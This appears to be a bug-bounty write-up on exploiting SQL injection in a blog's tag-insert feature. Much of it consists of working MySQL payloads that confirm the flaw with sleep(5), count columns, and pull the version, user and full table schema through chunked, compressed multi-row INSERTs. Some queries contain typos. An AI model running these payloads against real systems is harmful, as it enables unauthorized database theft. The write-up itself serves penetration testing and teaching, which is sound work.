# :game_die: SQL injection with INSERT statement

---

# SQL injection with INSERT statement

SQL injection vulnerabilities are often found in the INSERT statement when performing add operations, such as creating a new user or blog post. In this document, we examine a real-world case in which a user attempts to add a new tag to their blog post.

Our target is a blog platform that allows regular users to create and manage blog posts. However, we discovered a functionality issue during our examination. Specifically, inserting a single quote in the tag name causes a 500 exception with the message** “Can’t save your tag.” **We then tested some basic SQL injection payloads, such as `tag name' || sleep(5) || '`, and observed that the response waited for 5 seconds. This confirms the presence of a SQL injection vulnerability.

At this point, we have a valid SQL injection, but how can we enumerate the database and gain access to the service? We have some limitations with tags. Firstly, the tag name cannot be longer than 100 characters, which means we cannot dump a large amount of data through tag names. Secondly, to retrieve the tag name with an SQL injection payload, we must make two calls: one to create a tag and another to get its name.

To solve the second issue, we can use `www.example.com/get_all_tags`, which returns a list of tag names. However, we still need to address the first issue.

## SQL INSERT INTO

SQL injection at INSERT INTO is tricky. We can easily make real damage if something goes wrong. So first of all let’s examine a SQL insert into query syntax:

```
# Insert a single statement
INSERT INTO table (column1, column2, ....) VALUES ('value1', 'value2', ...);
```

```
# Or insert multiple statements at once.
INSERT INTO table (column1, column2, ....)
VALUES ('value1', 'value2', ...),
('value3', 'value4', ...),
```

We can use multi-value insertion to fetch more data in one call. To begin, we should define the number of columns in the query and its position. The column tag can be anywhere, such as the first, last, or even in the middle. Let’s use a `null` value to determine how many columns we have after the tag name.

```
tag name', null) -- - cause an error
tag name', null, null) -- - works ok!!!
```

So we know that we have two columns after the tag name. Now let’s see how many are before.

```
tag name', null, null), (null, 'tag name2', null, null) -- - cause an error
tag name', null, null), (null, null, 'tag name2', null, null) -- - cause an error
tag name', null, null), (null, null, null, 'tag name2', null, null) -- - cause an error
```

Okay, it’s not working. Let’s try using other data types, such as integers, booleans, strings, etc. It’s possible that we have a null constraint.

```
tag name', null, null), (1, 'tag name2', null, null) -- - works ok!!!
```

We can see that integers work well, but we can’t see this tag on the list in the UI. Why? It’s probably because the tag is associated with the ID of the user who added it. I quickly changed it to my ID:

```
tag name', null, null), (1442, 'tag name2', null, null) -- - works ok!!!
```

We can see that it works well. It’s important to note that when performing penetration testing or bug bounty hunting, we should do our best to avoid causing any damage. In this particular case, we are inserting a new tag for the user with ID 1. Any actions that modify another user’s data can cause trouble.

Our minimal setup is ready. Let’s get some basic information about the user and database version:

```
tag name', null, null),
(1442, @@version, null, null),
(1442, system_user(), null, null),
(1442, user(), null, null),
(1442, database(), null, null) -- -
```

Unfortunately, it is not enough. We need more data!!!

## Get SW’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

But before moving on we should clean up the mess. At this point, we created a bunch of tags. Let’s clear them. Say thanks to the API creators who make available bulk delete.

```
www.example.com/delete
{
"id": [1,2,3,4,...]
}
```

## Use the power of SQL

We know that our SQL query looks like this:

```
INSERT INTO table (user_id, tag_name, some_columns)
VALUES (1442, 'tag name', null);
```

Unfortunately, I can find the usage of the last column, so just set it to null every time.

Remember we have a limitation of 100 characters for tag names. I want to execute a regular SQL query to fetch the database structure. Of course, it contains more than 100 characters.

The next query creates a one-line JSON string with table schema and table name separated with colon `0x3a`== `:`

```
select json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME)) from information_schema.TABLES
```

It will return exactly 100 characters.

```
["information_schema:ALL_PLUGINS","information_schema:APPLICABLE_ROLES","information_schema:CHARACT
```

To get the whole table list we need to calculate how many characters we have and insert the required amount of chunks`:

```
select lengt(json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME))) from information_schema.TABLES
# 11093 characters
```

And now the payloads:

```
tag name', null),
(1442, (select substr(json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME)),1,100) from information_schema.TABLES), null),
(1442, (select substr(json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME)),100,200) from information_schema.TABLES), null),
(1442, (select substr(json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME)),200,300) from information_schema.TABLES), null),
........
(1442, (select substr(json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME)),11000, 11100) from information_schema.TABLES), null),
```

This may seem crazy, but we can actually obtain the entire schema at once!

## Bonus! How to speed it up!

We can exclude the default MySQL schema and only display table names without the schema name. Alternatively, we can use the MySQL `COMPRESS` function to achieve even faster results!

```
select length(to_base64(compress(json_arrayagg(concat_ws(0x3a, TABLE_SCHEMA, TABLE_NAME))))) from information_schema.TABLES
# 2639 characters
```

I use `to_base64` because I observed some issues with decoding bytes after compression on my local machine. This issue requires further investigation.

Finally, we have this query:

```
INSERT INTO table_name
VALUES
(1442, (SELECT SUBSTR(TO_BASE64(COMPRESS(JSON_ARRAYAGG(CONCAT_WS(0x3a, TABLE_SC EMA, TABLE_NAME))), 1, 100) FROM information_schema.TABLES), NULL),
(1442, (SELECT SUBSTR(TO_BASE64(COMPRESS(JSON_ARRAYAGG(CONCAT_WS(0x3a, TABLE_SCHEMA, TABLE_NAME))), 100, 200) FROM information_schema.TABLES), NULL),
(1442, (SELECT SUBSTR(TO_BASE64(COMPRESS(JSON_ARRAYAGG(CONCAT_WS(0x3a, TABLE_SCHEMA, TABLE_NAME))), 200, 300) FROM information_schema.TABLES), NULL),
........
(1442, (SELECT SUBSTR(TO_BASE64(COMPRESS(JSON_ARRAYAGG(CONCAT_WS(0x3a, TABLE_SCHEMA, TABLE_NAME))), 2600, 2700) FROM information_schema.TABLES), NULL);
```

Although executing such SQL is a little bit slow, however, it is much faster than doing 110 insertions. We only need to do 27 insertions, which is 5 times less work. Once we get the result and concatenate all chunks, we can use `from_base64` and `uncompress`.

```
select uncompress(from_base64('VSsAAHicpVlNk6M2EP0vWznmmkP2xniwQy02Xoxnd5NKqWSssZXBQATMrPPr0xKfAvTBzGFqbPS6'))
```

---
